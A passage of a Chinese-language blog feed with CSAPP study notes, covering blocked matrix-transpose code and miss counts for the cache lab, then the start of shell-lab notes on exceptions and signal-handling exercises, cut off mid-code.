class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后便会得到以下结果</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023722.png" alt="image-20240312103414780"></p>
<p>对角线图示:</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023761.png" alt="image-20240312110516371"></p>
<p>Miss:343离满分差了一点,我们发现色块之间的转置其实已经优化到上限了,现在要优化的就是对角线,因为对角线上的快存在原地转置的问题,比如A[0,0]和B[0,0]对应的位置其实是一样的,在这里面要是不特殊操作那发生的情况就类似于4*4的情况.要是你对4*4的例子理解透彻的话,那很简单,我们只用把A一整行的8个int全部都取出来,存在8个局部变量中,再转置到b,这样就能大大简化eviction的数量了.</p>
<p>优化一下对角线代码,即对内层进行展开.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> trans_2_desc[]=<span class="string">&quot;进行8*8的分块,并且优化对角线&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">trans_2</span><span class="params">(<span class="type">int</span> M,<span class="type">int</span> N ,<span class="type">int</span> A[M][N],<span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;<span class="type">int</span> i,j,m,n,x1,x2,x3,x4,x5,x6,x7,x8;</span><br><span class="line">    <span class="keyword">for</span>( i=<span class="number">0</span>;i&lt;M;i+=<span class="number">8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>( j=<span class="number">0</span>;j&lt;N;j+=<span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i==j)&#123;</span><br><span class="line">                <span class="keyword">for</span>(m=i;m&lt;<span class="number">8</span>+i;m++)</span><br><span class="line">                &#123;</span><br><span class="line">                   x1=A[m][j];</span><br><span class="line">                   x2=A[m][j+<span class="number">1</span>];</span><br><span class="line">                   x3=A[m][j+<span class="number">2</span>];</span><br><span class="line">                   x4=A[m][j+<span class="number">3</span>];</span><br><span class="line">                   x5=A[m][j+<span class="number">4</span>];</span><br><span class="line">                   x6=A[m][j+<span class="number">5</span>];</span><br><span class="line">                   x7=A[m][j+<span class="number">6</span>];</span><br><span class="line">                   x8=A[m][j+<span class="number">7</span>];</span><br><span class="line">                   B[j][m]=x1;</span><br><span class="line">                   B[j+<span class="number">1</span>][m]=x2;</span><br><span class="line">                   B[j+<span class="number">2</span>][m]=x3;</span><br><span class="line">                   B[j+<span class="number">3</span>][m]=x4;</span><br><span class="line">                   B[j+<span class="number">4</span>][m]=x5;</span><br><span class="line">                   B[j+<span class="number">5</span>][m]=x6;</span><br><span class="line">                   B[j+<span class="number">6</span>][m]=x7;</span><br><span class="line">                   B[j+<span class="number">7</span>][m]=x8;               </span><br><span class="line">                &#125;   </span><br><span class="line">            &#125;</span><br><span class="line">             <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">for</span>( m=i;m&lt;<span class="number">8</span>+i;m++)</span><br><span class="line">                    <span class="keyword">for</span>( n=j;n&lt;<span class="number">8</span>+j;n++)</span><br><span class="line">                    B[n][m]=A[m][n];</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Miss数为287个,达到满分标准</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023797.png" alt="image-20240312103528506"></p>
<h3 id="最简优化思路"><a href="#最简优化思路" class="headerlink" title="最简优化思路"></a>最简优化思路</h3><p>但是理论值256?(32*4*2&#x3D;256不包括Valgrind模拟产生的开销),可以考虑再优化.</p>
<p>我们想想,还有哪里会消耗呢?色块已经到上限了,那还是继续考虑对角线上的块.我们考虑到,每次我们都是这样做的,模拟下流程:</p>
<p>Load A[1]</p>
<p>Load B[1-8]—&gt;evict A[1]</p>
<p>Load A[2]  —&gt;evict B[2]</p>
<p>Load B[2]  —&gt;evict A[2]</p>
<p>…</p>
<p>Load A[7]  —&gt;evict B[7]</p>
<p>Load B[7]  —&gt;evict A[7]</p>
<p>Load A[8]  —&gt;evict B[8]</p>
<p>Load B[8]  —&gt;evict A[8]</p>
<p>有没有什么办法可以减少evict的次数呢?有两种可能</p>
<ul>
<li>Load A[i] 前 Load B[i]</li>
<li>Load B[i] 前 Load A[i]</li>
</ul>
<p>第一种pass,毕竟a是原数组,所以有没有办法把A[i]的值先放起来,再之后再Load对应的B[i]呢,我们发现,A的每一行只会load一遍,所以啊我们只用把A的那一行都用寄存器存起来后再把B对应的那一行load进去,相当于一行一行的把A复制到B中,最后所有的B都加载到缓存中了,再借助一个中间变量转置就好了,简单易懂!</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> trans_3_desc[]=<span class="string">&quot;进行8*8的分块,并且优化对角线,逼近极限&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">trans_3</span><span class="params">(<span class="type">int</span> M,<span class="type">int</span> N ,<span class="type">int</span> A[M][N],<span class="type">int</span> B[M][N])</span>&#123;</span><br><span class="line"><span class="type">int</span> i,j,m,n,x1,x2,x3,x4,x5,x6,x7,x8;</span><br><span class="line">    <span class="keyword">for</span>( i=<span class="number">0</span>;i&lt;M;i+=<span class="number">8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>( j=<span class="number">0</span>;j&lt;N;j+=<span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i==j)&#123;</span><br><span class="line">                <span class="keyword">for</span>(m=i;m&lt;<span class="number">8</span>+i;m++)&#123;</span><br><span class="line">                    x1=A[m][j],x2=A[m][j+<span class="number">1</span>],x3=A[m][j+<span class="number">2</span>],x4=A[m][j+<span class="number">3</span>],x5=A[m][j+<span class="number">4</span>],x6=A[m][j+<span class="number">5</span>],x7=A[m][j+<span class="number">6</span>],x8=A[m][j+<span class="number">7</span>];</span><br><span class="line">                    B[m][j]=x1,B[m][j+<span class="number">1</span>]=x2,B[m][j+<span class="number">2</span>]=x3,B[m][j+<span class="number">3</span>]=x4,B[m][j+<span class="number">4</span>]=x5,B[m][j+<span class="number">5</span>]=x6,B[m][j+<span class="number">6</span>]=x7,B[m][j+<span class="number">7</span>]=x8;</span><br><span class="line">                &#125;<span class="comment">//复制</span></span><br><span class="line">                <span class="keyword">for</span>(m=i;m&lt;<span class="number">8</span>+i;m++)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(n=j;n&lt;j+<span class="number">8</span>;n++)</span><br><span class="line">                    <span class="keyword">if</span>(m+<span class="number">1</span>&lt;=n)&#123;</span><br><span class="line">                    x1=B[m][n];</span><br><span class="line">                    B[m][n]=B[n][m];</span><br><span class="line">                    B[n][m]=x1;</span><br><span class="line">                    &#125;           <span class="comment">//原地转置</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">             <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">for</span>( m=i;m&lt;<span class="number">8</span>+i;m++)</span><br><span class="line">                    <span class="keyword">for</span>( n=j;n&lt;<span class="number">8</span>+j;n++)</span><br><span class="line">                    B[n][m]=A[m][n];</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试结果如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hits:2242, misses:259, evictions:227</span><br></pre></td></tr></table></figure>

<h2 id="Phase-2-64-64"><a href="#Phase-2-64-64" class="headerlink" title="Phase_2:64*64"></a>Phase_2:64*64</h2><h3 id="正常解法"><a href="#正常解法" class="headerlink" title="正常解法"></a>正常解法</h3><p>矩阵长宽各变成32*32的一倍,那简单,我们直接把之前做的矩阵优化丢进去一测试,完蛋!</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func 0 (Simple row-wise scan transpose): hits:3474, misses:4723, evictions:4691</span><br><span class="line">func 2 (进行8*8的分块,并且优化对角线): hits:3586, misses:4611, evictions:4579</span><br></pre></td></tr></table></figure>

<p>相较于给定的朴素函数竟然只有这么点提升,怎么回事呢?我们直接将把路径跟踪一下,不得了</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023839.png" alt="image-20240312112124338"></p>
<p>怎么会有这么多个miss eviction呢?一看地址,发现A load是没问题的,但是B Store就出现了问题,每次的后四个块地址就映射到前四个块的地址了,这小陷阱竟然被我发现了(逃,所以我们初步想一想是不是该进行8*4的分块来进行操作呢,说办就办</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> trans_4_desc[]=<span class="string">&quot;64*64的矩阵,思考分块8*4&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">trans_4</span><span class="params">(<span class="type">int</span> M,<span class="type">int</span> N,<span class="type">int</span> A[M][N],<span class="type">int</span> B[M][N])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,m,n;</span><br><span class="line">    <span class="keyword">for</span>( i=<span class="number">0</span>;i&lt;M;i+=<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span>( j=<span class="number">0</span>;j&lt;N;j+=<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">for</span>(m=i;m&lt;i+<span class="number">8</span>;m++)</span><br><span class="line">    <span class="keyword">for</span>(n=j;n&lt;j+<span class="number">4</span>;n++)</span><br><span class="line">    B[m][n]=A[n][m];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很快的得到了miss为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hits:6354, misses:1843, evictions:1811</span><br></pre></td></tr></table></figure>

<p>那是不是还要再优化一下对角线呢?这不太好优化,先想想满分是1300miss,我们采取8*4的块,这样子有点抽象,存在后四位数字用不到的情况,所以我们采取4*4试一试</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> trans_5_desc[]=<span class="string">&quot;64*64的矩阵,思考分块4*4&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">trans_5</span><span class="params">(<span class="type">int</span> M,<span class="type">int</span> N,<span class="type">int</span> A[M][N],<span class="type">int</span> B[M][N])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,x,x1,x2,x3,x4;</span><br><span class="line">    <span class="keyword">for</span>( i=<span class="number">0</span>;i&lt;M;i+=<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">for</span>( j=<span class="number">0</span>;j&lt;N;j+=<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">for</span>(x=i;x&lt;i+<span class="number">4</span>;x++)</span><br><span class="line">    &#123;</span><br><span class="line">        x1=A[x][j],x2=A[x][j+<span class="number">1</span>],x3=A[x][j+<span class="number">2</span>],x4=A[x][j+<span class="number">3</span>];</span><br><span class="line">        B[j][x]=x1,B[j+<span class="number">1</span>][x]=x2,B[j+<span class="number">2</span>][x]=x3,B[j+<span class="number">3</span>][x]=x4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以得到以下结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hits:6498, misses:1699, evictions:1667</span><br></pre></td></tr></table></figure>

<p>1699miss,看来想单纯考分块是不能过关的,所以只好继续思考8*4分块的优化方式,因为采取4*4分块的话,每一次Load A 在8*4分块中只需要一次,但在4*4中要两次,44分块的不足之处还是太严重了,所以只能继续思考8*4的分块方式,看能不能想象办法优化一下.</p>
<p>再想一想B的Store的顺序分别为:</p>
<p>前四行前四列–&gt;后四行前四列—&gt;前四行后四列—&gt;后四行后四列,所以得想个办法让B先不跳转到后四行,👍</p>
<p>在这里要引用这个<a href="https://blog.csdn.net/xbb224007/article/details/81103995">链接</a>,他讲的真心不错,图文并茂.</p>
<p>这是我们要转置的区域,虽然我们想8*4的转置,但还是建立在8*8的区域上面去转置的,画图真的能帮助分析理解,为了尽量减少冲突造成的miss,毕竟考虑到对角线的各种映射冲突导致的miss,我们尽量在读完一行后不再读它,所以每次用8个x来最大可能地保存值,从而让miss数尽可能的低</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023885.png" alt="image-20240312121524725"></p>
<p>所以为了不再访问前四行,我们把那些元素都取出来,顺便把元素提前转置了,之后直接平移就可以了</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023933.png" alt="image-20240312121624903"></p>
<p>有八个局部变量,所以我们先把{1}位置四个值存起来,然后把{2}位置的值丢进去,然后就可以不读这一行了,读第五行然后把存下来的关于{1}的值平移下去,重复四遍这种行为就好了.</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023975.png" alt="image-20240312201713022"></p>
<p>最后再转置后四行的后四列,这就是常规转置了,合理利用8个局部变量.</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023019.png" alt="image-20240312121719152"></p>
<p>当然我们在这里还是可以考虑对角线原地转置导致的miss,但对于一个8*4的块来说还是比较复杂的,等我以后牛逼了再来讨论(2024.3.12)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> trans_6_desc[]=<span class="string">&quot;64*64的矩阵,思考分块8*8下以8*4为小块进行转置&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">trans_6</span><span class="params">(<span class="type">int</span> M,<span class="type">int</span> N,<span class="type">int</span> A[M][N],<span class="type">int</span> B[M][N])</span>&#123;</span><br><span class="line">        <span class="type">int</span> i,j,x,y,x1,x2,x3,x4,x5,x6,x7,x8;</span><br><span class="line">        <span class="keyword">for</span>( i=<span class="number">0</span>;i&lt;M;i+=<span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>( j=<span class="number">0</span>;j&lt;N;j+=<span class="number">8</span>)&#123;</span><br><span class="line">                <span class="comment">//开始讨论一个8*8的分块,先把前8*4中的4*4先转置,然后再把后4*4挪到转置</span></span><br><span class="line">                <span class="comment">//块里的前8*4的后4*4分块中</span></span><br><span class="line">                <span class="keyword">for</span>(x=i;x&lt;i+<span class="number">4</span>;x++)&#123;</span><br><span class="line">                 <span class="comment">//x1-x4负责正常的转置即前四行前四列</span></span><br><span class="line">                    <span class="comment">//x5-x8负责前四行后四列的提前转置</span></span><br><span class="line">                    x1=A[x][j],x2=A[x][j+<span class="number">1</span>],x3=A[x][j+<span class="number">2</span>],x4=A[x][j+<span class="number">3</span>];</span><br><span class="line">                    x5=A[x][j+<span class="number">4</span>],x6=A[x][j+<span class="number">5</span>],x7=A[x][j+<span class="number">6</span>],x8=A[x][j+<span class="number">7</span>];</span><br><span class="line">                    B[j][x]=x1,B[j+<span class="number">1</span>][x]=x2,B[j+<span class="number">2</span>][x]=x3,B[j+<span class="number">3</span>][x]=x4;</span><br><span class="line">                    B[j][x+<span class="number">4</span>]=x5,B[j+<span class="number">1</span>][x+<span class="number">4</span>]=x6,B[j+<span class="number">2</span>][x+<span class="number">4</span>]=x7,B[j+<span class="number">3</span>][x+<span class="number">4</span>]=x8;</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//把后四行前四列转置,同时把提前转置的平移过去</span></span><br><span class="line">                <span class="keyword">for</span>(y=j;y&lt;j+<span class="number">4</span>;y++)&#123;</span><br><span class="line">                    x1=A[i+<span class="number">4</span>][y],x2=A[i+<span class="number">5</span>][y],x3=A[i+<span class="number">6</span>][y],x4=A[i+<span class="number">7</span>][y];</span><br><span class="line">                    x5=B[y][i+<span class="number">4</span>],x6=B[y][i+<span class="number">5</span>],x7=B[y][i+<span class="number">6</span>],x8=B[y][i+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[y][i+<span class="number">4</span>]=x1,B[y][i+<span class="number">5</span>]=x2,B[y][i+<span class="number">6</span>]=x3,B[y][i+<span class="number">7</span>]=x4;</span><br><span class="line">                    <span class="comment">//把存在B中的右上角的数字往左下角挪,注意偏移量</span></span><br><span class="line">                    B[y+<span class="number">4</span>][i]=x5,B[y+<span class="number">4</span>][i+<span class="number">1</span>]=x6,B[y+<span class="number">4</span>][i+<span class="number">2</span>]=x7,B[y+<span class="number">4</span>][i+<span class="number">3</span>]=x8;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//最后面的常规转置</span></span><br><span class="line">                <span class="keyword">for</span>(x=i+<span class="number">4</span>;x&lt;i+<span class="number">8</span>;x++)</span><br><span class="line">                &#123;</span><br><span class="line">                    x1=A[x][j+<span class="number">4</span>],x2=A[x][j+<span class="number">5</span>],x3=A[x][j+<span class="number">6</span>],x4=A[x][j+<span class="number">7</span>];</span><br><span class="line">                    B[j+<span class="number">4</span>][x]=x1,B[j+<span class="number">5</span>][x]=x2,B[j+<span class="number">6</span>][x]=x3,B[j+<span class="number">7</span>][x]=x4;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到的miss数量为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hits:9066, misses:1179, evictions:1147</span><br></pre></td></tr></table></figure>

<h3 id="最优解法"><a href="#最优解法" class="headerlink" title="最优解法"></a>最优解法</h3><p><a href="https://zhuanlan.zhihu.com/p/387662272">最优解法逼近理论最优1024</a>,这是别人写的,我没尝试,累了.</p>
<h2 id="Phase-3-61-67"><a href="#Phase-3-61-67" class="headerlink" title="Phase_3:61*67"></a>Phase_3:61*67</h2><p>尝试不同的分块方式</p>
<p>4*4(以此为例子,在这种方式下测试出不同分块情况下的miss数量,枚举)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> trans_7_desc[]=<span class="string">&quot;对于61*67在这里尝试各种各样的分块4*4&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">trans_7</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,x,y;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i+=<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;M;j+=<span class="number">4</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(x=i;x&lt;i+<span class="number">4</span>&amp;&amp;x&lt;N;x++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(y=j;y&lt;j+<span class="number">4</span>&amp;&amp;y&lt;M;y++)</span><br><span class="line">            B[y][x]=A[x][y];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>miss数量:</p>
<table>
<thead>
<tr>
<th align="center">分块规模</th>
<th align="center">Miss数量</th>
</tr>
</thead>
<tbody><tr>
<td align="center">4×4</td>
<td align="center">2425</td>
</tr>
<tr>
<td align="center">8×8</td>
<td align="center">2118</td>
</tr>
<tr>
<td align="center">14×14</td>
<td align="center">1996</td>
</tr>
<tr>
<td align="center">15×15</td>
<td align="center">2021</td>
</tr>
<tr>
<td align="center">16×16</td>
<td align="center">1992</td>
</tr>
<tr>
<td align="center">17×17</td>
<td align="center">1950</td>
</tr>
<tr>
<td align="center">18×18</td>
<td align="center">1961</td>
</tr>
<tr>
<td align="center">19×19</td>
<td align="center">1979</td>
</tr>
<tr>
<td align="center">20×20</td>
<td align="center">2002</td>
</tr>
<tr>
<td align="center">21×21</td>
<td align="center">1957</td>
</tr>
</tbody></table>
<blockquote>
<p>61 × 67: 10 points if m &lt; 2, 000, 0 points if m &gt; 3, 000</p>
</blockquote>
<p>所以我们选择17*17分块上交答案,用几个if else 函数编辑submission函数,使用<code>.driver.py</code>脚本运行测试分数就此通关,</p>
<p>如图:</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023057.png" alt="image-20240312155938912"></p>
<p>完美收官,并且miss数尽量达到最小!</p>
<h1 id="Lab小结"><a href="#Lab小结" class="headerlink" title="Lab小结"></a>Lab小结</h1><h2 id="Part-1"><a href="#Part-1" class="headerlink" title="Part_1"></a>Part_1</h2><p>这次的lab真的是比之前的难太多了,part_1还是好的,偷偷看了看别人的参考答案就码出来了,分情况讨论下几种miss,hit,eviction,主要能学习到以下几个函数的用法,分别是</p>
<ul>
<li><p>getopt</p>
</li>
<li><p>fscanf</p>
</li>
<li><p>malloc</p>
</li>
<li><p>fopen</p>
<p>第一次体会到如何从大量数据中快速读取所需要的信息,也才知道原来main函数是有默认参数的,并且默认参数是这样的意思<code>int argc char ** argv</code>,确实有意思,美中不足的是这个lab不用考虑Block太小了导致存放数据要横跨两个Block的这种情况(可能有这种情况吧?)所以我们不用考虑B的大小对miss与否的影响,降低了部分难度</p>
</li>
</ul>
<h2 id="Part-2"><a href="#Part-2" class="headerlink" title="Part_2"></a>Part_2</h2><p>Part_2确实是把我恶心坏了,坏透了的那种,从4*4开始就开始困惑,大脑在这几天一直在模拟cache的运行,各种冲突对撞,又因为有好多不知道的,网上的解析也没有说明的小东西,故而越发困惑,当然也在不断的实操中了解加深了Cache的运行(超简单版本),明白了其基本理念,虽然啊,鼠鼠我还是没有写作业(csapp课本上的),也没有看课本,只是听完了教授的课程,对着ppt和pdf和网上的一大堆教程开始硬抗着这恶心的lab.</p>
<p>不管之后会忘记多少,现在先做了再说,再把这教程敲完,把自己不会的全部补上,供后来人学习.便是鼠鼠我的价值.</p>
<h2 id="参考链接Part-2"><a href="#参考链接Part-2" class="headerlink" title="参考链接Part_2"></a><a href="https://blog.csdn.net/qq_42241839/article/details/122984159">参考链接Part_2</a></h2>]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP的lab6-shlab</title>
    <url>/CSAPP/lab6/2024/04/25/</url>
    <content><![CDATA[<blockquote>
<p><strong>异常控制流(Exceptional Control Flow)</strong></p>
<p>网上的各种各样的辅助资料真的是太多太多太繁杂了，从学链接装载库的时候就感觉到了一点点，兴许也可能有我先看了一些书，然后又去看小土刀的解读，又去看别人的解读，又去看教授的讲解，很多不懂得还是不懂，懂得也开始变得不懂，而书本反倒没看，重心要进行调整，着重关注对书本的阅读，不去理会什么中文版英文版，那个看得懂就看哪一个，至于其他的资料，应该是要辅助书本的学习，书上不懂的再去查资料辅助学习，这样子才能系统学习。</p>
<p>4.26：这个课本是真的又长又臭，看了一天多才看了20多面，难死我脑袋了！</p>
<p>4.27:看完了一整章，做家庭作业的时候，前面的作业都很简单，部分的三星和所有的四星的比较困难，部分作业都看不懂题目，索性直接跳过，感觉难度曲线比较陡峭，这几天，五一前完成shlab。</p>
</blockquote>
<p>家庭作业：难点题目，8.20，8.22，8.24，8.25,<strong>8.26</strong>，<a href="https://dreamanddead.github.io/CSAPP-3e-Solutions/">作业答案</a></p>
<p>会在复盘知识框架的过程中添加自己不懂得&#x2F;认为重要的点，辅助深刻理解shlab的知识点。</p>
<h1 id="知识框架"><a href="#知识框架" class="headerlink" title="知识框架"></a>知识框架</h1><h2 id="8-1Exception"><a href="#8-1Exception" class="headerlink" title="8.1Exception"></a>8.1Exception</h2><p>Exception的分类</p>
<table>
<thead>
<tr>
<th>类别</th>
<th>原因</th>
<th>异步&#x2F;同步</th>
<th>返回行为</th>
</tr>
</thead>
<tbody><tr>
<td>interrupt（中断）</td>
<td>来自I&#x2F;O设备信号</td>
<td>异步</td>
<td>下一条</td>
</tr>
<tr>
<td>trap（陷阱）</td>
<td>有意的异常</td>
<td>同步</td>
<td>下一条</td>
</tr>
<tr>
<td>fault（故障）</td>
<td>潜在可恢复错误</td>
<td>同步</td>
<td>可能返回当前</td>
</tr>
<tr>
<td>abort（终止）</td>
<td>不可恢复</td>
<td>同步</td>
<td>不会返回</td>
</tr>
</tbody></table>
<p>异步异常:由处理器外部的I&#x2F;O设备中事件产生</p>
<p>中断处理（Interrupt）：</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202404261326743.png" alt="image-20240425132916409"></p>
<p>陷阱处理（Trap)：</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202404261358886.png" alt="image-20240425144208070"></p>
<p>故障处理（Fault）：<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202404261358907.png" alt="image-20240425144245925"></p>
<p>所有的printf，exit（0),这些系统调用函数都可以使用syscall标准的调用进行实现</p>
<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202404261358919.png" alt="image-20240425150737672"></p>
<h2 id="8-3系统调用错误处理"><a href="#8-3系统调用错误处理" class="headerlink" title="8.3系统调用错误处理"></a>8.3系统调用错误处理</h2><h2 id="8-4进程控制"><a href="#8-4进程控制" class="headerlink" title="8.4进程控制"></a>8.4进程控制</h2><h2 id="8-5信号"><a href="#8-5信号" class="headerlink" title="8.5信号"></a>8.5信号</h2><p>习题8.8</p>
<p>猜测输出：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">long</span> counter = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">handler1</span><span class="params">(<span class="type">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">sigset_t</span> mask, prev_mask;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Sigfillset</span>(&amp;mask);</span><br><span class="line">    <span class="built_in">Sigprocmask</span>(SIG_BLOCK, &amp;mask, &amp;prev_mask);  <span class="comment">/* Block sigs */</span></span><br><span class="line">    <span class="built_in">Sio_putl</span>(--counter);</span><br><span class="line">    <span class="built_in">Sigprocmask</span>(SIG_SETMASK, &amp;prev_mask, <span class="literal">NULL</span>); <span class="comment">/* Restore sigs */</span></span><br><span class="line"></span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">sigset_t</span> mask, prev_mask;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%ld&quot;</span>, counter);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">signal</span>(SIGUSR1, handler1);</span><br><span class="line">    <span class="keyword">if</span> ((pid = <span class="built_in">Fork</span>()) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>) &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Kill</span>(pid, SIGUSR1);</span><br><span class="line">    <span class="built_in">Waitpid</span>(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Sigfillset</span>(&amp;mask);</span><br><span class="line">    <span class="built_in">Sigprocmask</span>(SIG_BLOCK, &amp;mask, &amp;prev_mask);  <span class="comment">/* Block sigs */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%ld&quot;</span>, ++counter);</span><br><span class="line">    <span class="built_in">Sigprocmask</span>(SIG_SETMASK, &amp;prev_mask, <span class="literal">NULL</span>); <span class="comment">/* Restore sigs */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并发错误避免</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*WARNING :This code is buggy !*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">handler</span><span class="params">(<span class="type">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="type">int</span> olderrno = errno;</span><br><span class="line">     sigset_ t mask_all, prev _all;</span><br><span class="line">     <span class="type">pid_t</span> pid;</span><br><span class="line">     <span class="built_in">Sigfillset</span>(&amp;mask_all);<span class="comment">//添加所有信号</span></span><br><span class="line">     <span class="keyword">while</span> ((pid = <span class="built_in">waitpid</span>(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>)) &gt; <span class="number">0</span>) <span class="comment">/*Reap a zombie child */</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="built_in">Sigprocmask</span>(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line">         <span class="built_in">deletejob</span>(pid);<span class="comment">/*Delete the child from the job list */</span></span><br><span class="line">         <span class="built_in">Sigprocmask</span>(SIG_SETMASK, &amp;prev _all, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">if</span> (errno != ECHILD) <span class="built_in">Sio_error</span>(<span class="string">&quot;waitpid error&quot;</span>);</span><br><span class="line">     errno = olderrno;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    <span class="built_in">Sigfillset</span>(&amp;mask_all);</span><br><span class="line">    <span 